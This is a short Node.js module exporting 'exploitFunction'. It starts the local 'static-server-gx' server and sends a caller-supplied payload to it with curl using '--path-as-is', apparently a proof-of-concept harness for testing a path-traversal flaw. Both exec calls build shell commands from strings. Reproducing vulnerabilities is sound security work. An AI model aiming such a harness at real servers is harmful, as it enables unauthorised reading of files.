function exploitFunction(payload) {
    const path = require("path");  // Ensure path is required
    const { exec } = require("child_process");

    // Start the server
    const server = "node ./node_modules/static-server-gx/server.js";
    exec(server, (error) => {
        if (error) {
            console.error("Failed to start server:", error);
            return;
        }

        // Send the payload
        const attack_string = `curl -v --path-as-is "http://127.0.0.1:10000${payload}"`;
        exec(attack_string, (error, stdout) => {
            if (error) {
                console.error("Failed to send payload:", error);
                return;
            }
            return stdout;
        });
    });
}

module.exports = { exploitFunction };